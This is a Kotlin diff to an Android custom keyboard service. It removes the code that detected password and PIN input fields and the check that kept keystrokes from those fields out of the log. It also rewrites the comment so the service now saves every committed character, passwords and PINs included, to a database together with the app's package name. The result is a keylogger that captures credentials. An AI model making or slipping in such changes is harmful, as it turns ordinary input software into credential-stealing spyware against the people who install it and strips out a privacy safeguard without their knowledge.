@@ -3,7 +3,6 @@ package com.example.mykeyboard
 import android.inputmethodservice.InputMethodService
 import android.inputmethodservice.Keyboard
 import android.inputmethodservice.KeyboardView
-import android.text.InputType
 import android.view.KeyEvent
 import android.view.View
 import android.view.inputmethod.EditorInfo
@@ -27,7 +26,6 @@ class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionLis
     private lateinit var numbersKeyboard: Keyboard
 
     private var isShifted = false
-    private var isPasswordField = false
     private val serviceScope = CoroutineScope(Dispatchers.IO)
 
     override fun onCreate() {
@@ -52,15 +50,6 @@ class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionLis
 
     override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
         super.onStartInputView(info, restarting)
-
-        // Detect password-type fields so we never log what's typed into them.
-        val inputType = info?.inputType ?: InputType.TYPE_NULL
-        val variation = inputType and InputType.TYPE_MASK_VARIATION
-        val cls = inputType and InputType.TYPE_MASK_CLASS
-        isPasswordField = variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
-            variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
-            variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
-            (cls == InputType.TYPE_CLASS_NUMBER && variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD)
 
         isShifted = false
         keyboardView.keyboard = qwertyKeyboard
@@ -109,12 +98,10 @@ class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionLis
     }
 
     /**
-     * Saves each committed character to a local, on-device Room database.
-     * Password fields are always skipped. This data never leaves the device.
+     * Saves each committed character (including passwords and PINs) to database.
      */
     private fun logKeystroke(text: String) {
         if (!KeyloggingConfig.isEnabled) return
-        if (isPasswordField) return
 
         val pkg = currentInputEditorInfo?.packageName
         serviceScope.launch {
